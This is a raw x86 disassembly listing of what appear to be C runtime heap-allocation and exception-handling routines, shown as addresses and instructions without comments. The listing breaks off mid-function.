  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
